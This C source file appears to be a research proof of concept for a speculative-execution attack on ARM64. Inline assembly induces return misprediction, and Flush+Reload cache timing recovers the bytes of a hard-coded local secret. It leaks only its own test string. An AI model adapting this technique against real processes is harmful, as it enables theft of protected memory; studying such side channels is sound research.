#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <time.h>
#include <stdint.h>	
#include <stdlib.h>
#include <unistd.h>
#include <ctype.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <malloc.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include "utils.h"

#define SECRET_LENGTH 7



void __attribute__((noinline))nop(){
	asm volatile("nop\n");
}

void __attribute__ ((noinline))pop_return(){
    // do nothing
	nop();
	asm volatile("add sp, sp, #16\n"); //pop frame pointer and ret address
	asm volatile("mov x10, sp\n");
	asm volatile("DC CIVAC, x10\n"); //flush sp
  	asm volatile("DSB ISH\n");
  	asm volatile("ISB\n");
	asm volatile("DMB SY\n"); //barrier

}

void __attribute__ ((noinline)) leak_secret(unsigned char *reloadbuffer, unsigned char *target_addr){
	register unsigned char pick;
    pop_return();
    while(1){
    	pick = reloadbuffer[(*target_addr) * 4096];
    }
    return;
}

int main(){
	struct timespec start, end;
	uint64_t time;
	int ITER = 5;
	char *reloadbuffer = (unsigned char *)mmap(0, RELOAD_BUF_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE | MAP_HUGETLB, -1, 0);
    unsigned char *secret = (unsigned char *)malloc(sizeof(unsigned char) * 8);
    memset(reloadbuffer, 2, RELOAD_BUF_SIZE);
    uint16_t CACHE_THRESHOLD = 120;
    strcpy(secret, "1234567");
    volatile unsigned char pick;
	pick = secret[0];
	uint8_t hit = 0;
	barrier();
	for(int i = 0; i < 2; i++){
		for(int l = 0; l < ITER; l++){
			hit = 0;
			for(int k = 0; k < RELOAD_BUF_SIZE; k = k + STRIDE){
				cacheflush(reloadbuffer + k);
			}
			barrier();
	    	leak_secret(reloadbuffer, secret + i);
	
			for(int j = 0; j < RELOAD_BUF_SIZE; j = j + STRIDE){
				clock_init(&start);
				pick = reloadbuffer[j];
				clock_end(&end);
				time = get_clock(start, end);
		
				if(time < CACHE_THRESHOLD && j / STRIDE != 0){
					printf("cache hit: %d\n", j / STRIDE);
					hit = 1;
				}
			}
			if(hit == 0){
				l = l - 1;
			}
		}
	}

	printf("stop\n");
    return 0;
}
